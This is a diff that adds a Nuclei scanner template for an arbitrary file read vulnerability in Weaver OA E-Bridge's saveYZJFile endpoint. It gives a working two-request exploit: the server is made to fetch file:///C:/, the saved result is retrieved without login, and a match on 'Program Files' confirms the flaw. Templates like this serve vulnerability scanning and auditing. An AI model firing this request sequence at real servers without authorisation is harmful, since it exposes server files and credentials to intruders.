@@ -1,0 +1,45 @@
+id: weaver-e-bridge-windows-saveyzjfile-file-read
+
+info:
+  name: weaver-e-bridge-windows-saveyzjfile-file-read
+  author: SleepingBag945
+  severity: high
+  description: 泛微OA E-Bridge saveYZJFile接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+  tags: eBridge,weaver,oa,read
+
+http:
+  - raw:
+      - |
+        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip
+
+      - |
+        GET /file/fileNoLogin/{{idname}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip        
+
+    extractors:
+      - type: regex
+        name: idname
+        internal: true
+        group: 1
+        regex:
+          - '"id":"(.*?)"'
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl: 
+          - status_code_1 == 200 && contains(body_1,'id')
+          - "status_code_2 == 200 && contains(body_2, 'Program Files')"
+        condition: and
+
+
